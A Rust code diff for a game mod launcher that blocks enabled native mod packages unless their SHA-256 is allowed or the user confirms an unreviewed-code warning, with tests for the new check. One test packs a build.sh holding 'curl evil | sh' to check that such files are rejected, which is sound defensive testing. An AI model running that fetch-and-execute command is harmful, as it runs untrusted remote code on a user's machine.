@@ -364,9 +364,50 @@ pub const INSTALLED: &str = sunrise_launcher_smod::mod_list::NATIVE_DIR;
 
 /// The native mods turned on in the game folder `home`, unpacked into a folder [`build`] takes.
 /// Each flat `.smod` passes the registry's shared package boundary; no code is run.
-pub fn installed_mods(home: &Path) -> Result<PathBuf, String> {
-    stage_installed(home, root().join("installed.incoming"))?
-        .ok_or_else(|| no_mods_to_build().into())
+pub fn installed_mods(home: &Path) -> Result<PathBuf, Failed> {
+    stage_allowed(home, &root().join("installed.incoming"))
+}
+
+/// A native package turned on in a game folder whose file neither came verified from the
+/// registry nor was confirmed with the unreviewed-code warning: one copied into the folder by
+/// hand, say.
+#[derive(Clone, Debug, PartialEq, Eq)]
+pub struct Unreviewed {
+    pub id: String,
+    pub name: String,
+    /// The file's name in the game folder.
+    pub file: String,
+    pub sha256: String,
+}
+
+type AskUnreviewed = Box<dyn Fn(&[Unreviewed]) -> bool + Send + Sync>;
+static ASK_UNREVIEWED: std::sync::OnceLock<AskUnreviewed> = std::sync::OnceLock::new();
+
+/// How this process confirms running [`Unreviewed`] packages: the window shows the
+/// unreviewed-code warning, the command line answers with `--trust-native-code`. Set once, by
+/// the program's entry; with none set, a build refuses them.
+pub fn ask_unreviewed_with(ask: impl Fn(&[Unreviewed]) -> bool + Send + Sync + 'static) {
+    let _ = ASK_UNREVIEWED.set(Box::new(ask));
+}
+
+/// [`stage_installed`] for a build: a package that is neither in
+/// [`crate::backend::allowed_native_files`] nor confirmed now, for this build, stops it.
+fn stage_allowed(home: &Path, out: &Path) -> Result<PathBuf, Failed> {
+    let mut allowed = crate::backend::allowed_native_files()?;
+    loop {
+        let staged = {
+            let _manifest = crate::browser::lock_home(home).map_err(|e| e.to_string())?;
+            stage_installed(home, out.to_owned(), Some(&allowed))
+        };
+        match staged {
+            Err(Failed::Unreviewed(found))
+                if ASK_UNREVIEWED.get().is_some_and(|ask| ask(&found)) =>
+            {
+                allowed.extend(found.into_iter().map(|package| package.sha256));
+            }
+            staged => return staged?.ok_or(Failed::Nothing),
+        }
+    }
 }
 
 /// What a build says when the profile's mods folder holds nothing to build.
@@ -374,10 +415,16 @@ fn no_mods_to_build() -> &'static str {
     tr("There are no mods to build. Add a mod to this profile's mods folder first.")
 }
 
-/// [`installed_mods`] into `out`, which it empties first.
-pub(crate) fn stage_installed(home: &Path, out: PathBuf) -> Result<Option<PathBuf>, String> {
+/// [`installed_mods`] into `out`, which it empties first. With `allowed`, a package whose
+/// file's SHA-256 isn't in it stops the staging with [`Failed::Unreviewed`], naming every such
+/// package; planning reads packages without it, since it runs none of their code.
+pub(crate) fn stage_installed(
+    home: &Path,
+    out: PathBuf,
+    allowed: Option<&std::collections::BTreeSet<String>>,
+) -> Result<Option<PathBuf>, Failed> {
     let _lock = crate::browser::lock_home(home).map_err(|error| error.to_string())?;
-    crate::browser::installed::recover_game_install(home)?;
+    crate::browser::installed::recover_game_install(home).map_err(String::from)?;
     let _ = fs::remove_dir_all(&out);
     let mut paths: Vec<PathBuf> = fs::read_dir(home.join(INSTALLED))
         .map(|dir| dir.flatten().map(|e| e.path()).collect())
@@ -385,6 +432,7 @@ pub(crate) fn stage_installed(home: &Path, out: PathBuf) -> Result<Option<PathBu
     paths.retain(|p| p.extension().is_some_and(|e| e == "smod"));
     paths.sort();
     let mut count = 0;
+    let mut unreviewed = Vec::new();
     for path in paths {
         // A file that can't be read is no mod: it has no id to be on or off under, and the game
         // doesn't load it, so it must not stop a build of the others.
@@ -394,6 +442,21 @@ pub(crate) fn stage_installed(home: &Path, out: PathBuf) -> Result<Option<PathBu
         if !crate::browser::mod_list::is_enabled(home, &bundle.manifest.id) {
             continue;
         }
+        if let Some(allowed) = allowed {
+            let sha256 = sunrise_launcher_smod::index::sha256_file(&path)?.to_ascii_lowercase();
+            if !allowed.contains(&sha256) {
+                unreviewed.push(Unreviewed {
+                    id: bundle.manifest.id.clone(),
+                    name: bundle.manifest.name.clone(),
+                    file: path
+                        .file_name()
+                        .map(|name| name.to_string_lossy().into_owned())
+                        .unwrap_or_default(),
+                    sha256,
+                });
+                continue;
+            }
+        }
         let dir = out.join(&bundle.manifest.id);
         for (name, bytes) in &bundle.files {
             let to = dir.join(name);
@@ -402,8 +465,12 @@ pub(crate) fn stage_installed(home: &Path, out: PathBuf) -> Result<Option<PathBu
         }
         count += 1;
     }
+    if !unreviewed.is_empty() {
+        let _ = fs::remove_dir_all(&out);
+        return Err(Failed::Unreviewed(unreviewed));
+    }
     if count == 0 {
-        return Err(no_mods_to_build().into());
+        return Err(Failed::Other(no_mods_to_build().into()));
     }
     fs::create_dir_all(&out).map_err(|e| e.to_string())?;
     Ok(Some(out))
@@ -1003,6 +1070,9 @@ pub enum Failed {
     },
     /// The folder holds no native mod to build.
     Nothing,
+    /// These packages are turned on but came neither verified from the registry nor confirmed
+    /// with the unreviewed-code warning, and running them wasn't confirmed for this build.
+    Unreviewed(Vec<Unreviewed>),
     /// Mods this build can't use were saved into worlds: the player chooses (stay, or back the
     /// worlds up and build without them).
     Worlds(Box<AtStake>),
@@ -1059,6 +1129,13 @@ impl std::fmt::Display for Failed {
             Self::Sdk { refusal, .. } => std::fmt::Display::fmt(refusal, f),
             Self::Worlds(stake) => f.write_str(&stake.text),
             Self::Nothing => f.write_str(no_mods_to_build()),
+            Self::Unreviewed(found) => {
+                let names: Vec<&str> = found.iter().map(|p| p.name.as_str()).collect();
+                f.write_str(&trf(
+                    "Nothing was built: {mods} didn't come from the Sunrise registry, and nobody has checked their code. Confirm the warning to build them, or pass --trust-native-code on the command line.",
+                    &[("mods", &names.join(", "))],
+                ))
+            }
         }
     }
 }
@@ -1998,7 +2075,10 @@ fn isolated(
                 });
             }
             Err(
-                error @ (Failed::Tools(_) | Failed::Tool { .. } | Failed::RegistryConflict { .. }),
+                error @ (Failed::Tools(_)
+                | Failed::Tool { .. }
+                | Failed::RegistryConflict { .. }
+                | Failed::Unreviewed(_)),
             ) => return Err(error),
             Err(Failed::Sdk { refusal, .. }) => return Err(said(&skip, refusal.to_string())),
             Err(Failed::Worlds(stake)) => return Err(Failed::Worlds(stake)),
@@ -2104,10 +2184,7 @@ pub(crate) fn build_exact_client(
                 .prefix(".native-input-")
                 .tempdir_in(root())
                 .map_err(|e| e.to_string())?;
-            let folder = {
-                let _manifest = crate::browser::lock_home(home).map_err(|e| e.to_string())?;
-                stage_installed(home, input.path().join("mods"))?.ok_or(Failed::Nothing)?
-            };
+            let folder = stage_allowed(home, &input.path().join("mods"))?;
             let built = pipeline(
                 cache,
                 base,
@@ -2453,8 +2530,8 @@ mod tests {
         let native = home.path().join(INSTALLED);
         fs::create_dir_all(&native).unwrap();
         fs::write(native.join("broken.smod"), b"old format").unwrap();
-        let error = stage_installed(home.path(), home.path().join("out")).unwrap_err();
-        assert_eq!(error, no_mods_to_build());
+        let error = stage_installed(home.path(), home.path().join("out"), None).unwrap_err();
+        assert_eq!(error.to_string(), no_mods_to_build());
     }
 
     #[test]
@@ -2483,13 +2560,64 @@ mod tests {
         zip.finish().unwrap();
         crate::browser::mod_list::set_enabled(home.path(), "zed_mod", true).unwrap();
         let out = home.path().join("out");
-        let staged = stage_installed(home.path(), out.clone()).unwrap();
+        let staged = stage_installed(home.path(), out.clone(), None).unwrap();
         assert_eq!(staged, Some(out.clone()));
         assert_eq!(
             fs::read_to_string(out.join("zed_mod/src/lib.rs")).unwrap(),
             "fn hook() {}"
         );
         assert!(!out.join("aaa").exists());
+    }
+
+    #[test]
+    fn a_native_file_copied_in_by_hand_stops_the_build_until_its_digest_is_allowed() {
+        use std::io::Write;
+        let home = tempfile::tempdir().unwrap();
+        let native = home.path().join(INSTALLED);
+        fs::create_dir_all(&native).unwrap();
+        let file = native.join("copied.smod");
+        let mut zip = zip::ZipWriter::new(fs::File::create(&file).unwrap());
+        let manifest = format!(
+            "id='copied'\nname='Copied'\nversion='0.1.0'\napi='0.2'\ncapabilities=['registries']\n[native]\ngame='{}'\nsunrise='{}'\nmixins='{}'\n",
+            crate::backend::PINNED_GAME,
+            "a".repeat(40),
+            "b".repeat(40)
+        );
+        for (name, text) in [
+            ("Cargo.toml", "[package]\nname='copied'\nversion='0.1.0'\n"),
+            ("src/lib.rs", "fn hook() {}"),
+            ("sunrise-mod.toml", manifest.as_str()),
+        ] {
+            zip.start_file(name, zip::write::SimpleFileOptions::default())
+                .unwrap();
+            zip.write_all(text.as_bytes()).unwrap();
+        }
+        zip.finish().unwrap();
+        crate::browser::mod_list::set_enabled(home.path(), "copied", true).unwrap();
+        let sha256 = sunrise_launcher_smod::index::sha256_file(&file).unwrap();
+        let out = home.path().join("out");
+
+        let other = std::collections::BTreeSet::from(["0".repeat(64)]);
+        let Err(Failed::Unreviewed(found)) =
+            stage_installed(home.path(), out.clone(), Some(&other))
+        else {
+            panic!("a file nobody allowed must not stage for a build");
+        };
+        assert_eq!(
+            found,
+            [Unreviewed {
+                id: "copied".into(),
+                name: "Copied".into(),
+                file: "copied.smod".into(),
+                sha256: sha256.to_ascii_lowercase(),
+            }]
+        );
+        assert!(!out.exists());
+
+        let allowed = std::collections::BTreeSet::from([sha256.to_ascii_lowercase()]);
+        let staged = stage_installed(home.path(), out.clone(), Some(&allowed)).unwrap();
+        assert_eq!(staged, Some(out.clone()));
+        assert!(out.join("copied/src/lib.rs").exists());
     }
 
     #[test]
@@ -3648,15 +3776,16 @@ mod tests {
             }
             zip.finish().unwrap();
         };
+        let stage = || stage_installed(&home, d.join("out"), None).map(Option::unwrap);
         pack("veinminer.smod", None);
-        assert!(installed_mods(&home).is_err(), "off until turned on");
+        assert!(stage().is_err(), "off until turned on");
         // With nothing in the mods folder the error says so, never an empty line.
         assert_eq!(
-            installed_mods(&home).unwrap_err(),
+            stage().unwrap_err().to_string(),
             "There are no mods to build. Add a mod to this profile's mods folder first."
         );
         crate::browser::mod_list::set_enabled(&home, "veinminer", true).unwrap();
-        let out = installed_mods(&home).unwrap();
+        let out = stage().unwrap();
         let found = bundles(&out).unwrap();
         assert_eq!(
             fs::read(found[0].dir.join("src/lib.rs")).unwrap(),
@@ -3679,7 +3808,7 @@ mod tests {
             )]
         );
         pack("veinminer.smod", Some(("data/veinminer/table.bin", "data")));
-        let out = installed_mods(&home).unwrap();
+        let out = stage().unwrap();
         let path = out.join("veinminer/data/veinminer/table.bin");
         assert_eq!(fs::read(&path).unwrap(), b"data");
         let first = version_for(
@@ -3705,7 +3834,7 @@ mod tests {
             .unwrap()
         );
         pack("veinminer.smod", Some(("build.sh", "curl evil | sh")));
-        assert!(installed_mods(&home).is_err(), "only Rust and TOML sources");
+        assert!(stage().is_err(), "only Rust and TOML sources");
     }
 
     /// A player's report (11-04): Right-Click Crops 1.0.0 pins Nightly 2026-10-31's commit, so
